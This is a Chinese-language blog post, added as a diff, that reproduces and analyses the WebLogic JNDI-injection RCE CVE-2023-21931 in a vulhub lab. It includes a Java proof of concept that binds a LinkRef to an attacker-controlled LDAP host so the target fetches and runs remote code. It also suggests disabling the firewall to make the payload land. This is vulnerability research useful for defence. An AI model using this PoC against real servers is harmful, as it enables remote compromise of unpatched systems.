@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Okaytc" />
+  <meta name="description" content="生活 健身 学习 沉淀" />
+  
+  
+  <title>
+    
+      weblogic远程代码执行漏洞（CVE-2023-21931）复现与分析 
+      
+      
+      |
+    
+     Okaytc
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/head-3.jpg">
+    <link rel="icon" href="/images/head-3.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/head-3.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Okaytc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">weblogic远程代码执行漏洞（CVE-2023-21931）复现与分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-04-28 16:45:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                    #漏洞复现
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    #代码审计
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>weblogic远程代码执行漏洞（CVE-2023-21931）复现与分析，同CVE-2023-21839一样由jndi注入导致的漏洞，同时间出的官方修复补丁，漏洞也在同一个类下的不同判断分支中，复现分析一下，CVE-2023-21839后面再补。</p>
+<h1 id="0x01、漏洞描述"><a href="#0x01、漏洞描述" class="headerlink" title="0x01、漏洞描述"></a>0x01、漏洞描述</h1><p><strong>CVE-2023-21931</strong><br>Oracle WebLogic Server 是一款Java EE应用服务器。<br>受影响版本的WebLogic中WLNamingManager#getObjectInstance()存在JNDI查找逻辑，导致攻击者可以通过t3协议传入特定的对象触发反序列化逻辑，执行任意代码。<br>当传入boundObject 对象是 LinkRef 的实现类时，会调用传入对象 boundObject 的 getLinkName() 方法，并使用 lookup() 方法对getLinkName() 方法返回的 linkAddrType 地址执行远程 JNDI 加载。</p>
+<h1 id="0x02、漏洞范围"><a href="#0x02、漏洞范围" class="headerlink" title="0x02、漏洞范围"></a>0x02、漏洞范围</h1><p><strong>CVE-2023-21931</strong><br>Oracle WebLogic Server(Core)@[12.2.1.0.0, 12.2.1.4.0]<br>Oracle WebLogic Server(Core)@[14.1.1.0.0, 14.1.1.0.0]<br>Oracle WebLogic Server(Core)@[12.1.2.0.0, 12.1.3.0.0]<br>Oracle WebLogic Server(Core)@[10.3.6.0, 10.3.6.0]</p>
+<h1 id="0x03、环境搭建"><a href="#0x03、环境搭建" class="headerlink" title="0x03、环境搭建"></a>0x03、环境搭建</h1><h2 id="环境获取"><a href="#环境获取" class="headerlink" title="环境获取"></a>环境获取</h2><p>这里直接拉取的vulhub上4ra1n师傅的环境：<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839</a></p>
+<p>下载进CVE-2023-21839目录下执行</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>docker启动</p>
+<p><img src="/posts/5a99c827/w1.png" title="docker启动"></p>
+<p>成功访问到即可</p>
+<p><img src="/posts/5a99c827/w2.png" title="成功访问"></p>
+<p>将源码从docker中拖出来放进idea就可以审计了<br>相关命令：</p>
+<pre><code>【】表示填选项
+进入镜像环境
+docker exec -it 【进程序号】 /bin/bash
+复制镜像文件到主机上
+docker cp 【进程序号】:/【目录】 /【主机目录】
+</code></pre>
+<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>调试环境（踩坑点也在里面了）:</p>
+<p>1、对docker-compose.yml文件进行编辑添加调试端口</p>
+<p><img src="/posts/5a99c827/w25.png" title="调试端口"></p>
+<p>2、运行启动容器<code>docker-compose up -d</code></p>
+<p>3、命令<code>docker exec -it --user root 86 /bin/bash</code>进入容器，–user对应使用root身份进入容器（容器没有vim环境，需要root权限运行yum -y install vim安装vim编辑器）</p>
+<p><img src="/posts/5a99c827/w26.png" title="进入容器"></p>
+<p>4、安装vim编辑器（如果下载的docker环境有的话忽略）</p>
+<p><img src="/posts/5a99c827/w27.png" title="安装vim"></p>
+<p>5、编辑weblogic环境目录下&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;bin&#x2F;setDomainEnv.sh文件</p>
+<p><img src="/posts/5a99c827/w28.png" title="编辑setDomainEnv.sh"></p>
+<p>6、在JAVA_DEBUG&#x3D;”” export JAVA_DEBUG和if [ “${debugFlag}” &#x3D; “true” ] ; then之间添加调试代码，端口需要与docker-compose.yml中添加的对应</p>
+<pre><code>debugFlag=&quot;true&quot;
+DEBUG_PORT=5556
+export debugFlag
+</code></pre>
+<p><img src="/posts/5a99c827/w29.png" title="添加调试代码"></p>
+<p>7、再将Lib包和weblogic环境依赖打压缩包复制出来导入idea项目库中即可，命令<code>docker cp 【进程序号】:/【目录】 /【主机目录】</code></p>
+<p><img src="/posts/5a99c827/w30.png" title="打包"></p>
+<p>8、然后重启容器即可<code>docker restart 86</code>,86对应我的容器id</p>
+<p>9、最后在idea添加运行配置-添加远程jvm调试填选对应的地址端口即可</p>
+<p><img src="/posts/5a99c827/w31.png" title="添加远程调试"></p>
+<p>10、运行调试，显示连接目标即配置正确</p>
+<p><img src="/posts/5a99c827/w32.png" title="配置正确"></p>
+<p>11、发包断点即可进行调试</p>
+<p><img src="/posts/5a99c827/w33.png" title="断点调试"></p>
+<h1 id="0x04、漏洞复现"><a href="#0x04、漏洞复现" class="headerlink" title="0x04、漏洞复现"></a>0x04、漏洞复现</h1><p>poc:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;t3://192.168.43.20:7001&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        ht.put(Context.PROVIDER_URL, url); <span class="comment">// 目标</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(ht);</span><br><span class="line">        <span class="type">LinkRef</span> <span class="variable">LR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkRef</span>(<span class="string">&quot;ldap://192.168.43.233:9999/#EvilPayload3&quot;</span>);</span><br><span class="line">        c.rebind(<span class="string">&quot;poc&quot;</span>, LR);</span><br><span class="line">        c.lookup(<span class="string">&quot;poc&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/5a99c827/w3.png" title="发送payload"></p>
+<p>执行命令创建文件成功</p>
+<p><img src="/posts/5a99c827/w4.png" title="执行成功"></p>
+<p>测试过程中如果遇到目标服务器无法访问或者payload发送不成功，关闭weblogic服务器防火墙<br>linux命令</p>
+<pre><code>//安装ufw
+apt-get install ufw
+//关闭防火墙
+sudo ufw disable
+//开启防火墙
+sudo ufw enable
+</code></pre>
+<h1 id="0x05、原理分析"><a href="#0x05、原理分析" class="headerlink" title="0x05、原理分析"></a>0x05、原理分析</h1><p>当<code>INITIAL_CONTEXT_FACTORY</code>上下文的工厂为<code>weblogic.jndi.WLInitialContextFactory</code>类时，</p>
+<p>JNDI<code>InitialContext</code>上下文会对环境变量中读取<code>weblogic.jndi.WLInitialContextFactory</code>工厂的上下文实现方法去实例化对象</p>
+<p>跟下<code>InitialContext</code>上下文获取比较好理解</p>
+<p><img src="/posts/5a99c827/w14.png" title="InitialContext"><br><img src="/posts/5a99c827/w15.png" title="InitialContext"></p>
+<p>获取到环境配置，调用<code>getDefaultInitCtx</code>方法，调用<code>NamingManager.getInitialContext</code>获取上下文器</p>
+<p><img src="/posts/5a99c827/w16.png" title="getDefaultInitCtx"></p>
+<p>从中读取到上下文工厂</p>
+<p><img src="/posts/5a99c827/w17.png" title="INITIAL_CONTEXT_FACTORY"></p>
+<p>返回调用<code>WLInitialContextFactory.getInitialContext</code>方法</p>
+<p><img src="/posts/5a99c827/w18.png" title="getInitialContext"></p>
+<p>获取到上下文实现类<code>WLContextImpl</code></p>
+<p><img src="/posts/5a99c827/w19.png" title="WLContextImpl"></p>
+<p>获取到实现类过后，调用<code>WLContextImpl.lookup</code>方法</p>
+<p><img src="/posts/5a99c827/w20.png" title="WLContextImpl"></p>
+<p>向<code>node</code>（即stub向通信服务器）调用<code>lookup</code>方法</p>
+<p><img src="/posts/5a99c827/w22.png" title="node"></p>
+<p>最后返回管理器处理对象的实例化结果<code>NamingManager.getObjectInstance</code></p>
+<p><img src="/posts/5a99c827/w21.png" title="getObjectInstance"></p>
+<hr>
+<p>再来看服务端对传输过来的t3协议数据的处理</p>
+<p>通过<code>weblogic.rmi.internal.BasicServerRef#handleRequest</code>对数据进行接受处理，会调用动态代理<code>invoke</code>方法</p>
+<p><img src="/posts/5a99c827/w35.png" title="invoke"></p>
+<p>相关调用栈：</p>
+<p><img src="/posts/5a99c827/w36.png" title="调用栈"></p>
+<p>invoke方法再次调用到<code>BasicServerRef#invoke</code></p>
+<p><img src="/posts/5a99c827/w37.png" title="BasicServerRef#invoke"></p>
+<p>中间调用过程可参考这篇<a hraf="https://nosec.org/home/detail/5082.html">文章</a>中的lookup执行在weblogic服务器端的接受流程</p>
+<p>最后调用到触发位置<code>WLNamingManager#getObjectInstance</code>方法</p>
+<p><img src="/posts/5a99c827/w5.png" title="getObjectInstance"></p>
+<p>通过当传入对象<code>boundObject</code>属于<code>LinkRef</code>类时，先会调用<code>LinkRef#getLinkName</code>方法获取连接名</p>
+<p><img src="/posts/5a99c827/w34.png" title="LinkRef对象"></p>
+<p>获取连接名的逻辑：</p>
+<p>创建<code>LinkRef</code>对象时向构造参数传递入连接地址的字符串</p>
+<p><img src="/posts/5a99c827/w6.png" title="LinkRef"></p>
+<p>构造方法中会调用<code>StringRefAddr</code>方法，该方法将地址字符串传递给常量<code>contents</code></p>
+<p><img src="/posts/5a99c827/w7.png" title="StringRefAddr"></p>
+<p>然后通过<code>super</code>方法调用父类构造方法将地址字符串传递添加<code>addrs</code>，同时将<code>LinkRef</code>类名传递赋值给<code>className</code></p>
+<p><img src="/posts/5a99c827/w8.png" title="super"></p>
+<p>构造方法看完回到主体调用<code>getLinkName</code>方法，<code>className</code>在上文已经赋值存在，且<code>className</code>等于<code>linkClassName</code>的值</p>
+<p><img src="/posts/5a99c827/w9.png" title="getLinkName"></p>
+<p>if条件都满足，最后调用<code>getContent</code>返回<code>Content</code>（即创建<code>LinkRef</code>类时传递的构造参数的地址字符串）</p>
+<p><img src="/posts/5a99c827/w10.png" title="getContent"><br><img src="/posts/5a99c827/w11.png" title="getContent"></p>
+<p>最后执行<code>lookup</code>实现jndi注入</p>
+<p><img src="/posts/5a99c827/w12.png" title="lookup"></p>
+<p>直接调用实现的效果，因为只需要<code>LinkRef</code>对象传入即可，其他参数设置空即可触发漏洞演示</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">LinkRef</span> <span class="variable">LR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkRef</span>(<span class="string">&quot;ldap://192.168.43.233:9999/#EvilPayload&quot;</span>);</span><br><span class="line">        <span class="type">WLNamingManager</span> <span class="variable">WL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WLNamingManager</span>();</span><br><span class="line">        WL.getObjectInstance(LR, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/5a99c827/w13.png" title="getObjectInstance"></p>
+<h1 id="0x06、漏洞修复"><a href="#0x06、漏洞修复" class="headerlink" title="0x06、漏洞修复"></a>0x06、漏洞修复</h1><p>官方4月公布的补丁：<br><a target="_blank" rel="noopener" href="https://www.oracle.com/security-alerts/cpuapr2023.html">https://www.oracle.com/security-alerts/cpuapr2023.html</a></p>
+<h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/5082.html">https://nosec.org/home/detail/5082.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201005#h3-11">https://www.anquanke.com/post/id/201005#h3-11</a><br><a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/e817cb11.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-04-28 16:45:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">
+                        #漏洞复现
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        #代码审计
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">0x01、漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4"><span class="toc-text">0x02、漏洞范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x03、环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E8%8E%B7%E5%8F%96"><span class="toc-text">环境获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">调试环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x04、漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">0x05、原理分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">0x06、漏洞修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x07、参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
+        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
+        placeholder: 'here',
+        avatar: 'monsterid',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + weblogic%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-21931%EF%BC%89%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2F5a99c827.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/5a99c827.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
